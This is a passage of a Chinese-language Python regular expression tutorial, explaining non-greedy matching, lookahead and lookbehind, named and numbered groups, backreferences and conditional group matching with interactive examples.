<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’\b\d{2,4}\b’ , s )<span style="">         </span># b: 2</span></span><span style="font-family:宋体">位数到</span><span lang="EN-US"><span style="font-family:Times New Roman">4</span></span><span style="font-family:宋体">位数</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['22', '333', '4444']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’\b\d{5,}\b’, s )<span style="">           </span># c: 5</span></span><span style="font-family:宋体">位数以上的数</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['55555', '666666']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’\b\d{1,4}\b’ , s )<span style="">         </span># 4</span></span><span style="font-family:宋体">位数以下的数</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['1', '22', '333', '4444']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘*?’ ‘+?’ ‘??’ </span></span><span style="font-family:宋体">最小匹配</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">‘*’ ‘+’ ‘?’</span></span><span style="font-family:宋体">通常都是尽可能多的匹配字符。有时候我们希望它尽可能少的匹配。比如一个</span><span lang="EN-US"><span style="font-family:Times New Roman">c</span></span><span style="font-family:宋体">语言的注释</span><span style="font-family:Times New Roman"> <span lang="EN-US">‘/* part 1 */ /* part 2 */’</span></span><span style="font-family:宋体">，如果使用最大规则：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s =r ‘/* part 1 */ code /* part 2 */’</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’/\*.*\*/’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">[‘/* part 1 */ code /* part 2 */’]</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">结果把整个字符串都包括进去了。如果把规则改写成</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’/\*.*?\*/’ , s )<span style="">                    </span>#</span></span><span style="font-family:宋体">在</span><span lang="EN-US"><span style="font-family:Times New Roman">*</span></span><span style="font-family:宋体">后面加上</span><span lang="EN-US"><span style="font-family:Times New Roman">?</span></span><span style="font-family:宋体">，表示尽可能少的匹配</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['/* part 1 */', '/* part 2 */']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span style="font-family:宋体"><span style="font-size:16px">结果正确的匹配出了注释里的内容</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.95pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">1.3<span style="">   </span></span></span><span style="font-family:宋体">前向界定与后向界定</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">有时候需要匹配一个跟在特定内容后面的或者在特定内容前面的字符串，</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">提供一个简便的前向界定和后向界定功能，或者叫前导指定和跟从指定功能。它们是：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘(?&lt;=…)’ </span></span><span style="font-family:宋体">前向界定</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">括号中</span><span lang="EN-US"><span style="font-family:Times New Roman">’…’</span></span><span style="font-family:宋体">代表你希望匹配的字符串的前面应该出现的字符串。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘(?=…)’<span style="">  </span></span></span><span style="font-family:宋体">后向界定</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">括号中的</span><span lang="EN-US"><span style="font-family:Times New Roman">’…’</span></span><span style="font-family:宋体">代表你希望匹配的字符串后面应该出现的字符串。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">例：</span><span style="font-family:Times New Roman"> </span><span style="font-family:宋体">你希望找出</span><span lang="EN-US"><span style="font-family:Times New Roman">c</span></span><span style="font-family:宋体">语言的注释中的内容，它们是包含在</span><span lang="EN-US"><span style="font-family:Times New Roman">’/*’</span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">’*/’</span></span><span style="font-family:宋体">之间，不过你并不希望匹配的结果把</span><span lang="EN-US"><span style="font-family:Times New Roman">’/*’</span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">’*/’</span></span><span style="font-family:宋体">也包括进来，那么你可以这样用：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s=r’/* comment 1 */<span style="">  </span>code<span style="">  </span>/* comment 2 */’</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’(?&lt;=/\*).+?(?=\*/)’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">[' comment 1 ', ' comment 2 ']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">注意这里我们仍然使用了最小匹配，以避免把整个字符串给匹配进去了。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">要注意的是，前向界定括号中的表达式必须是常值，也即你不可以在前向界定的括号里写正则式。比如你如果在下面的字符串中想找到被字母夹在中间的数字，你不可以用前向界定：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">例：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s = ‘aaa111aaa , bbb222 , 333ccc ‘</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r’(?&lt;=[a-z]+)\d+(?=[a-z]+)' , s )<span style="">          </span># </span></span><span style="font-family:宋体">错误的用法</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">它会给出一个错误信息：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">error: look-behind requires fixed-width pattern</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">不过如果你只要找出后面接着有字母的数字，你可以在后向界定写正则式：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’\d+(?=[a-z]+)’, s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['111', '333']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">如果你一定要匹配包夹在字母中间的数字，你可以使用组（</span><span lang="EN-US"><span style="font-family:Times New Roman">group</span></span><span style="font-family:宋体">）的方式</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall (r'[a-z]+(\d+)[a-z]+' , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['111']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">组的使用将在后面详细讲解。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">除了前向界定前向界定和后向界定外，还有前向非界定和后向非界定，它的写法为：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:宋体"><code><strong><span lang="EN-US" style="">‘(?&lt;!...)’</span></strong></code><code><strong><span style="">前向非界定<span lang="EN-US"></span></span></strong></code></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><code><span style=""><span style="font-size:16px"><span style="font-family:宋体">只有当你希望的字符串前面不是<span lang="EN-US">’…’</span>的内容时才匹配<span lang="EN-US"></span></span></span></span></code></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><span style="font-family:宋体"><code><strong><span lang="EN-US" style="">‘(?!...)’</span></strong></code><code><strong><span style="">后向非界定</span></strong></code><span lang="EN-US" style=""></span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">只有当你希望的字符串后面不跟着</span><span lang="EN-US"><span style="font-family:Times New Roman">’…’</span></span><span style="font-family:宋体">内容时才匹配。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">接上例，希望匹配后面不跟着字母的数字</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’\d+(?!\w+)’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['222']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">注意这里我们使用了\</span><span lang="EN-US"><span style="font-family:Times New Roman">w</span></span><span style="font-family:宋体">而不是像上面那样用</span><span lang="EN-US"><span style="font-family:Times New Roman">[a-z]</span></span><span style="font-family:宋体">，因为如果这样写的话，结果会是：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’\d+(?![a-z]+)’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['11', '222', '33']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">这和我们期望的似乎有点不一样。它的原因，是因为</span><span lang="EN-US"><span style="font-family:Times New Roman">’111’</span></span><span style="font-family:宋体">和</span><span lang="EN-US"><span style="font-family:Times New Roman">’222’</span></span><span style="font-family:宋体">中的前两个数字也是满足这个要求的。因此可看出，正则式的使用还是要相当小心的，因为我开始就是这样写的，看到结果后才明白过来。不过</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">试验起来很方便，这也是脚本语言的一大优点，可以一步一步的试验，快速得到结果，而不用经过烦琐的编译、链接过程。也因此学习</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">就要多试，跌跌撞撞的走过来，虽然曲折，却也很有乐趣。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">1.4 </span></span><span style="font-family:宋体">组的基本知识</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">上面我们已经看过了</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">的正则式的很多基本用法。不过如果仅仅是上面那些规则的话，还是有很多情况下会非常麻烦，比如上面在讲前向界定和后向界定时，取夹在字母中间的数字的例子。用前面讲过的规则都很难达到目的，但是用了组以后就很简单了。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘(‘’)’<span style="">       </span></span></span><span style="font-family:宋体">无命名组</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">最基本的组是由一对圆括号括起来的正则式。比如上面匹配包夹在字母中间的数字的例子中使用的</span><span lang="EN-US"><span style="font-family:Times New Roman">(\d+)</span></span><span style="font-family:宋体">，我们再回顾一下这个例子：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s = ‘aaa111aaa , bbb222 , 333ccc ‘</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall (r'[a-z]+(\d+)[a-z]+' , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['111']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.9pt"><span style="font-size:16px"><strong style=""><span style="font-family:宋体">可以看到</span><span lang="EN-US"><span style="font-family:Times New Roman">findall</span></span><span style="font-family:宋体">函数只返回了包含在</span><span lang="EN-US"><span style="font-family:Times New Roman">’()’</span></span><span style="font-family:宋体">中的内容，而虽然前面和后面的内容都匹配成功了，却并不包含在结果中。</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">除了最基本的形式外，我们还可以给组起个名字，它的形式是</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘(?P&lt;name&gt;…)’ </span></span><span style="font-family:宋体">命名组</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">‘(?P’</span></span><span style="font-family:宋体">代表这是一个</span><span lang="EN-US"><span style="font-family:Times New Roman">Python</span></span><span style="font-family:宋体">的语法扩展</span><span lang="EN-US"><span style="font-family:Times New Roman">’&lt;…&gt;’</span></span><span style="font-family:宋体">里面是你给这个组起的名字，比如你可以给一个全部由数字组成的组叫做</span><span lang="EN-US"><span style="font-family:Times New Roman">’num’</span></span><span style="font-family:宋体">，它的形式就是</span><span lang="EN-US"><span style="font-family:Times New Roman">’(?P&lt;num&gt;\d+)’</span></span><span style="font-family:宋体">。起了名字之后，我们就可以在后面的正则式中通过名字调用这个组，它的形式是</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘(?P=name)’ </span></span><span style="font-family:宋体">调用已匹配的命名组</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">要注意，再次调用的这个组是已被匹配的组，也就是说它里面的内容是和前面命名组里的内容是一样的。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">我们可以看更多的例子：请注意下面这个字符串各子串的特点。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s='aaa111aaa,bbb222,333ccc,444ddd444,555eee666,fff777ggg'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">我们看看下面的正则式会返回什么样的结果：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r'([a-z]+)\d+([a-z]+)' , s )<span style="">             </span># </span></span><span style="font-family:宋体">找出中间夹有数字的字母</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">[('aaa', 'aaa'), ('fff', 'ggg')]</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r '(?P&lt;g1&gt;[a-z]+)\d+(?P=g1)' , s )<span style=""> </span>#</span></span><span style="font-family:宋体">找出被中间夹有数字的前后同样的字母</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['aaa']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r'[a-z]+(/d+)([a-z]+)' , s )<span style="">             </span>#</span></span><span style="font-family:宋体">找出前面有字母引导，中间是数字，后面是字母的字符串中的中间的数字和后面的字母</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">[('111', 'aaa'), ('777', 'ggg')]</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">我们可以通过命名组的名字在后面调用已匹配的命名组，不过名字也不是必需的。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><strong style=""><span lang="EN-US"><span style="font-family:Times New Roman">‘\number’<span style="">             </span></span></span><span style="font-family:宋体">通过序号调用已匹配的组</span><span lang="EN-US"></span></strong></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">正则式中的每个组都有一个序号，序号是按组从左到右，从</span><span lang="EN-US"><span style="font-family:Times New Roman">1</span></span><span style="font-family:宋体">开始的数字，你可以通过下面的形式来调用已匹配的组</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">比如上面找出被中间夹有数字的前后同样的字母的例子，也可以写成：</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; re.findall( r’([a-z]+)\d+\1’ , s )</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">['aaa']</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">结果是一样的。</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-family:宋体"><span style="font-size:16px">我们再看一个例子</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">&gt;&gt;&gt; s='111aaa222aaa111 , 333bbb444bb33'</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r'(\d+)([a-z]+)(\d+)(\2)(\1)' , s )<span style="">           </span>#</span></span><span style="font-family:宋体">找出完全对称的</span><span style="font-family:Times New Roman"> </span><span style="font-family:宋体">数字－字母－数字－字母－数字</span><span style="font-family:Times New Roman"> </span><span style="font-family:宋体">中的数字和字母</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px">[('111', 'aaa', '222', 'aaa', '111')]</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US"><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span lang="EN-US"><span style="font-family:Times New Roman">Python2.4</span></span><span style="font-family:宋体">以后的</span><span lang="EN-US"><span style="font-family:Times New Roman">re</span></span><span style="font-family:宋体">模块，还加入了一个新的条件匹配功能</span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm"><span style="font-size:16px"><code><strong><span lang="EN-US" style=""><span style="font-family:宋体">‘(?(</span></span></strong></code><var><strong><span lang="EN-US" style=""><span style="font-family:Times New Roman">id/name</span></span></strong></var><span style="font-family:宋体"><code><strong><span lang="EN-US" style="">)yes-pattern|no-pattern)’ </span></strong></code><code><strong><span style="">判断指定组是否已匹配，执行相应的规则<span lang="EN-US"></span></span></strong></code></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">这个规则的含义是，如果</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">id/name</span></span><span style="font-family:宋体">指定的组在前面匹配成功了，则执行</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">yes-pattern</span></span><span style="font-family:宋体">的正则式，否则执行</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">no-pattern</span></span><span style="font-family:宋体">的正则式。</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">举个例子，比如要匹配一些形如</span><span lang="EN-US" style=""><span style="font-family:Times New Roman"> usr@mail </span></span><span style="font-family:宋体">的邮箱地址，不过有的写成</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">&lt; usr@mail &gt;</span></span><span style="font-family:宋体">即用一对</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">&lt;&gt;</span></span><span style="font-family:宋体">括起来，有点则没有，要匹配这两种情况，可以这样写</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:Times New Roman">&gt;&gt;&gt; s='&lt;usr1@mail1&gt;<span style="">  </span>usr2@maill2'</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r'(&lt;)?\s*(\<a href="mailto:w+@w+%29/s*%28?%281%29&gt;%29'%20rel=">w+@<span style="color:#000000">\</span>w+)\s*(?(1)&gt;)'</a> , s )</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:Times New Roman">[('&lt;', 'usr1@mail1'), ('', 'usr2@maill2')]</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">不过如果目标字符串如下</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:Times New Roman">&gt;&gt;&gt; s='&lt;usr1@mail1&gt;<span style="">  </span>usr2@maill2 &lt;usr3@mail3<span style="">   </span>usr4@mail4&gt;<span style="">  </span>&lt; usr5@mail5 '</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">而你想得到要么由一对</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">&lt;&gt;</span></span><span style="font-family:宋体">包围起来的一个邮件地址，要么得到一个没有被</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">&lt;&gt;</span></span><span style="font-family:宋体">包围起来的地址，但不想得到一对</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">&lt;&gt;</span></span><span style="font-family:宋体">中间包围的多个地址或不完整的</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">&lt;&gt;</span></span><span style="font-family:宋体">中的地址，那么使用这个式子并不能得到你想要的结果</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:Times New Roman">&gt;&gt;&gt; re.findall( r'(&lt;)?\s*(\<a href="mailto:w+@w+%29/s*%28?%281%29&gt;%29'%20rel=">w+@<span style="color:#000000">\</span>w+)\s*(?(1)&gt;)'</a> , s )</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-size:16px"><span style="font-family:Times New Roman">[('&lt;', 'usr1@mail1'), ('', 'usr2@maill2'), ('', 'usr3@mail3'), ('', 'usr4@mail4'), ('', 'usr5@mail5')]</span></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">它仍然找到了所有的邮件地址。</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span style="font-size:16px"><span style="font-family:宋体">想要实现这个功能，单纯的使用</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">findall</span></span><span style="font-family:宋体">有点吃力，需要使用其它的一些函数，比如</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">match</span></span><span style="font-family:宋体">或</span><span lang="EN-US" style=""><span style="font-family:Times New Roman">search</span></span><span style="font-family:宋体">函数，再配合一些控制功能。这部分的内容将在下面详细讲解。</span><span lang="EN-US" style=""></span></span></p> 
<p class="MsoNormal" style="margin:2.5pt 0cm; text-indent:17.85pt"><span lang="EN-US" style=""><span style="font-family:Times New Roman; font-size:16px"> </span></span></p> 
